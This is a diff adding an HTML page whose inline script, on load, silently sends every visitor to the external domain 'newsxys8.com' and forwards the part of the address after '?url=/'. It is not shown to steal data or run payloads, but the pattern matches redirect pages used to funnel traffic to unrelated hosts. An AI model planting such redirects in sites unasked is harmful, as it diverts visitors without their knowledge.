@@ -1,0 +1,11 @@
+<html>
+  <script>
+    indexChar="?url=/"
+    targetUrl="https://newsxys8.com/"
+    charIndex=window.location.href.indexOf(indexChar);
+    if(charIndex > -1) {
+        targetUrl=targetUrl+window.location.href.substr( charIndex+indexChar.length)
+    }
+    window.location.href=targetUrl
+  </script>
+</html>
